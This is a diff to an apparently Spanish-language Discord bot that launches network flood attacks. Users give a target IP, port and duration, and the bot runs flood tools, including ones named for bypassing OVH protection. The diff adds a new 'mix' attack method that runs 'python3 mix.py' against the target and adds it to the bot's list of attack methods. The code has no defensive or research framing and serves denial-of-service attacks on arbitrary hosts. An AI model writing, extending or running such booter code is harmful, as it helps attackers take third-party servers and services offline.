@@ -134,6 +134,10 @@ async def udppps_command(ctx, ip: str = None, port: str = None, tiempo: str = No
 async def ovhbypass_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'ovhbypass', ip, port, tiempo)
 
+@bot.command(name='mix')
+async def mix_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
+    await realizar_ataque(ctx, 'mix', ip, port, tiempo)
+    
 @bot.command(name='ovhudp')
 async def ovhudp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
     await realizar_ataque(ctx, 'ovhudp', ip, port, tiempo)
@@ -189,6 +193,8 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
         comando = f'./udp {ip} {port_int} {tiempo_int}'
     elif metodo == 'hex':
         comando = f'./hex {ip} {port_int} {tiempo_int}'
+    elif metodo == 'mix':
+        comando = f'python3 mix.py {ip} {port_int} {tiempo_int}'
     elif metodo == 'udppps':
         comando = f'./udppps {ip} {port_int} {tiempo_int}'
     elif metodo == 'ovhbypass':
@@ -225,7 +231,7 @@ async def show_methods(ctx):
         color=discord.Color.blue()
     )
 
-    embed.add_field(name="L4 UDP Protocol", value="`• udp`\n`• hex`\n`• udppps`\n`• ovhudp`", inline=False)
+    embed.add_field(name="L4 UDP Protocol", value="`• udp`\n`• hex`\n`• udppps`\n`• ovhudp`\n` • mix`", inline=False)
     embed.add_field(name="L4 TCP Protocol", value="`• ovhtcp`\n`• tcp`\n`• ovhbypass`", inline=False)
 
     embed.set_footer(text=f"Solicitado por {ctx.author.name}#{ctx.author.discriminator}", icon_url=ctx.author.avatar.url)
